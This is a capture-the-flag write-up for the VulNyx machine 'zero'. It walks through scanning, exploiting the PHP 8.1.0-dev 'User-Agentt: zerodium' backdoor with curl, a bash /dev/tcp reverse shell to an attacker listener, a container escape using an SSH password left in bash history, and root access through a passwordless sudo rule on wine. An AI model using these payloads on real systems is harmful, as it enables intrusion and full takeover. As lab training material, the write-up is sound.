# zero

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| zero | d4t4s3c | Low | VulNyx |

**Summary:** The zero machine exposed a PHP development server on port 8080 running an extremely unusual build, PHP 8.1.0-dev. That exact version is famous for shipping a hidden backdoor planted inside its source code, a backdoor that executes any command embedded in a request header named `User-Agentt`, with the second letter doubled. The PHP codebase activated it whenever the header began with the marker `zerodium`, a reference to the exploit broker that allegedly inserted the code. Sending `zerodiumsystem('id');` returned `uid=0(root)`, immediately confirming remote code execution as the superuser. A `bash` reverse shell delivered through the same header connected back to a root session, but the environment gave away an important detail: the hostname was a 64 character container ID and the working directory was `/var/www/html`, meaning the shell lived inside a Docker container rather than on the host itself. Reading the container's root shell history disclosed a container escape path, a command that logged into the host over SSH with the password `L14mD0ck3Rp0w4` for the user `liam`. That credential worked, landing the attacker on the real machine as `liam`. The final escalation was pure configuration comedy: `liam` was allowed to run `/usr/bin/wine` as root without a password, and invoking `wine cmd` opened a Microsoft Windows command interpreter running as the `ZERO\root` user, whose mapped drive letter granted direct access to the Linux filesystem, including both the user flag and the root flag.

---

## Reconnaissance

The engagement opened with the standard host discovery sweep.

1. The target was located at `192.168.56.112`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 21:16 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00026s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.00071s latency).
MAC Address: 08:00:27:60:0B:3D (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.112 (192.168.56.112)
Host is up (0.0015s latency).
MAC Address: 08:00:27:8B:5F:58 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.02 seconds

┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.112
```

2. A fast full port scan exposed three services:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=1000 -Pn $ip  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 21:17 -0400
Nmap scan report for 192.168.56.112 (192.168.56.112)
Host is up (0.00018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:8B:5F:58 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.14 seconds
```

3. Version and script detection identified the services in detail:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 22,80,8080 -sC -sV -T4 -Pn $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 21:17 -0400
Nmap scan report for 192.168.56.112 (192.168.56.112)
Host is up (0.00037s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8080/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-open-proxy: Proxy might be redirecting requests
MAC Address: 08:00:27:8B:5F:58 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds

```

The service banner on port 8080 was the decisive find: a PHP CLI development server running `PHP 8.1.0-dev`. That development snapshot is historically documented to contain an embedded backdoor, making it an instant remote code execution target.

---

## Initial Access

### The PHP 8.1.0-dev Backdoor

4. A plain request to the PHP server returned a minimal page:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip:8080/                                        
<h1>Zerodium</h1>
```

The page name itself, `Zerodium`, matches the exploit broker implicated in the planted backdoor, further confirming the expected technique.

5. The backdoor is triggered through a header named `User-Agentt` (note the doubled letter) whose value begins with `zerodium`. Command execution was tested with an `id` call:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip:8080/ -H "User-Agentt: zerodiumsystem('id');"
uid=0(root) gid=0(root) groups=0(root)
<h1>Zerodium</h1>
```

The header executed `system('id')` and the response body leaked the output, proving remote code execution as root.

### Reverse Shell Inside a Container

6. A Bash reverse shell was sent through the same backdoor, aimed at a listener on the attacking machine:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip:8080/ -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/192.168.56.104/4444 0>&1\"');"
```

7. The listener received the connection and the session was stabilized:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nc -lvnp 4444                                                       
listening on [any] 4444 ...
connect to [192.168.56.104] from (UNKNOWN) [192.168.56.112] 39132
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@6ad9beefaa2d:/var/www/html# script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
root@6ad9beefaa2d:/var/www/html# ^Z
zsh: suspended  nc -lvnp 4444

┌──(kali㉿kali)-[~/nyx]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444

root@6ad9beefaa2d:/var/www/html# export TERM=xterm
root@6ad9beefaa2d:/var/www/html# export SHELL=/bin/bash
root@6ad9beefaa2d:/var/www/html# cd
root@6ad9beefaa2d:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
6ad9beefaa2d
```

A root shell was obtained, but the hostname `6ad9beefaa2d` and the web root working directory made the situation clear: this was a root shell inside a Docker container, not on the physical host. The container's root history would have to be mined for a way out.

---

## Privilege Escalation

### Container Escape through SSH

8. Inspecting the container's root home directory revealed a shell history file:

```bash
root@6ad9beefaa2d:~# ls -la
total 24
drwx------ 1 root root 4096 May  5  2023 .
drwxr-xr-x 1 root root 4096 May  5  2023 ..
-rw-r--r-- 1 root root  129 Aug 13 01:28 .bash_history
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 May  5  2023 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
root@6ad9beefaa2d:~# cat .bash_history 
sshpass -p 'L14mD0ck3Rp0w4' ssh liam@127.0.0.1
cd
stty -echo
id;whoami;hostname
exit
script -qc /bin/bash
exit
ls -la /home
exit
```

The first line was the escape key: a full `sshpass` command connecting to the host via the loopback interface as the user `liam`, with the password `L14mD0ck3Rp0w4` written out in plaintext.

9. That same credential worked against the host's SSH service:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ ssh liam@$ip           
The authenticity of host '192.168.56.112 (192.168.56.112)' can't be established.
ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.112' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
liam@192.168.56.112's password: 
Linux zero 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64
Last login: Fri May  5 19:44:57 2023 from 192.168.1.10
liam@zero:~$ id;hostname
uid=1000(liam) gid=1000(liam) grupos=1000(liam)
zero
```

The SSH login placed the attacker on the actual machine, host `zero`, as the user `liam`.

### Root Through Wine

10. Checking `sudo` privileges for `liam` surfaced the final and most unusual escalation primitive:

```bash
liam@zero:~$ sudo -l
Matching Defaults entries for liam on zero:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User liam may run the following commands on zero:
    (root) NOPASSWD: /usr/bin/wine
```

`liam` could run the Windows compatibility layer `/usr/bin/wine` as root without a password. Wine translates Windows executables into Linux processes, and it can even launch a `cmd` command interpreter.

11. Wine's `cmd` was invoked as root:

```bash
liam@zero:~$ sudo -u root /usr/bin/wine cmd
it looks like wine32 is missing, you should install it.
multiarch needs to be enabled first.  as root, please
execute "dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32"
Microsoft Windows 6.1.7601

Z:\home\liam>whoami
002c:err:winediag:SECUR32_initNTLMSP ntlm_auth was not found or is outdated. Make sure that ntlm_auth >= 3.0.25 is in your path. Usually, you can find it in the winbind package of your distribution.
ZERO\root
```

Wine reported its environment as `Microsoft Windows 6.1.7601`, and the `whoami` response identified the interpreter as `ZERO\root`, confirming the shell was running with root privileges. Wine maps the Linux filesystem root to the `Z:\` drive, so the flags were reachable from the prompt.

12. Both flags were read through the Wine command interpreter:

```bash
Z:\home\liam>type Z:\home\liam\user.txt && type Z:\root\root.txt
```

With the Linux filesystem exposed on the `Z:` drive and the process running as root, both the user flag and the root flag were accessible, completing the compromise.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep isolated the target at `192.168.56.112`, and port scans exposed SSH on port 22, Apache on port 80, and a PHP development server running `PHP 8.1.0-dev` on port 8080.

2. **Vulnerability Discovery**: The PHP version banner matched the known embedded backdoor in the PHP 8.1.0-dev snapshot. A request carrying the header `User-Agentt` prefixed with `zerodium` executed arbitrary commands.

3. **Exploitation**: An `id` call through the backdoor confirmed execution as root, and a Bash reverse shell delivered in the same header returned a root shell, albeit inside a Docker container.

4. **Internal Enumeration**: The container's root `.bash_history` revealed an `sshpass` command logging into the host as `liam` with the password `L14mD0ck3Rp0w4`, enabling a container escape to a real shell on the host.

5. **Privilege Escalation**: The `sudo` rule granting `liam` passwordless access to `/usr/bin/wine` was used to launch `wine cmd` as root. The resulting Windows command interpreter ran as `ZERO\root` and read both flags through its mapped Linux filesystem.